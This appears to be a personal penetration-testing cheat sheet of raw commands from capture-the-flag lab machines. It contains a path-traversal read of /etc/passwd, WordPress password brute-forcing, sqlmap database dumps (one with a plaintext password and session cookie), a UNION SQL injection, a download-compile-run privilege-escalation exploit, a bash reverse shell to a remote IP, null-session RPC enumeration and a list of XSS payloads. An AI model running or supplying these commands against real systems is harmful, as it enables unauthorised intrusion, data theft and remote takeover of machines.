curl http://10.10.227.125:3000/public/plugins/alertlist/../../../../../../../../../../etc/passwd --path-as-is
=============================================================================================================

gobuster dir -u http://10.10.191.70:3000 --exclude-length 28034 -t 100 -r -x php,txt,html -w dir-med.txt 2>/dev/null

=========================================================================================================
wpscan --url http://derpnstink.local/weblog/ --passwords /usr/share/wordlists/fasttrack.txt --usernames admin -t 25

wpscan --url http://derpnstink.local/weblog/ --enumerate u,p

=================================================================================

sqlmap -r sqli --risk=3 --level=5 --dbs --dump --batch --threads=10

sqlmap -r sqli1 --risk=3 --level=5 --dump --batch --threads=10 -D jabcd0cs -T odm_user

sqlmap -u http://10.10.X.X/login --method=POST --data=username=admin&password=admin -p username,password --risk=3 --level=3 --random-agent

sqlmap –dbms mysql –headers=”X-forwarded-for:1*” -u http://10.10.162.101

sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -p blog --dbms=mysql -D vn_admin -T be_users -C username,password --dump


sqlmap -u http://contacttracer.thm --data="username=admin&password=sweetpandemonium" --random-agent --banner --dbs --cookie="PHPSESSID=r2ud86tmlhna1er5tob81t8m3u" --level 5 --risk3




Commands:

netdiscover -i eth1

nmap -p- -A (IP)

https://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user UNION SELECT 1,version(),3,4,5,6,7,8,9

ssh webmin@192.168.56.104

/bin/bash

lsb_release -a

cd /tmp
wget http://192.168.56.102/37292.c
gcc 37292.c -o 37292
chmod +x 37292
./37292 


========================================================================================

sudo whatweb https://10.10.11.102
sudo whatweb https://10.10.11.102 -v

sudo curl --help
sudo curl --help all
sudo curl -s -XGET -I 'https://www.windcorp.htb/' -k

sudo openssl s_client -connect 10.10.11.102:443

sudo gowitness -h
sudo gowitness single -h  
sudo gowitness single --fullpage -h  
sudo gowitness single --fullpage --output anubis.png https://www.windcorp.htb

sudo apt info feroxbuster
sudo apt install feroxbuster -y
sudo feroxbuster -h
sudo feroxbuster --url https://www.windcorp.htb --random-agent --extensions html asp aspx --insecure --auto-tune
 --threads 75 --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --output an
ubis.ferox 

sudo wfuzz -h
sudo wfuzz -u https://10.10.11.102 -H "Host: FUZZ.windcorp.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 315

=============================================================================================

tar -xvf exploit.tar
tar -xvf crasher.tar

=================================================================================

bash -i >& /dev/tcp/192.168.56.101/8080 0>&1

==============================================================

sudo rpcdump.py -h
sudo rpcdump.py windcorp.htb/administrator@10.10.11.102 -debug

sudo rpcclient -h
sudo rpcclient --user='' --no-pass 10.10.11.102
help
srvinfo
netshareenumall
enumdomusers
enumdomgroups
getdcname windcorp

====================================XSS===============================================


'';!--"<xss>=&{()}

<script>alert(1)</script>

</title><script>alert(1)</script>

a--><script>alert(1)</script>

><script>alert(1)</script>

'';!--"<xss>=&{()}

<svg/onload=alert(1)

<svg/onload=alert(1)%20
==============================================================================================
after dumping .db file we can interact with sqlite3 client from linux

sqlite3 example.db
PRAGMA table_info(customers);
SELECT * FROM customers;

